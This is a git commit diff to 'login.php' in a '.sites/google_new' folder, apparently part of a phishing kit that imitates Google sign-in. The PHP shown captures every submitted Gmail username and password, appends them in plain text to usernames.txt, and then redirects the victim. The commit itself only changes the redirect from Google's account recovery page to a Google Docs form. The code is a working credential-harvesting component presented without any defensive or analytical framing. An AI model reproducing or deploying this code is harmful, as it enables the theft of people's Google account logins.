23264ce098331d186dcdfddfe7696b2d3a9aaaab
angelpino443 <109489544+angelpino443@users.noreply.github.com>
2022-07-17 23:06:34 -0500

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+header('Location: https://docs.google.com/forms/d/1HECQ7heDHfIpA9VP68PfexVoGirpJUzsdeaCsBPEWJo/edit?usp=drive_web');
 exit();
 ?>
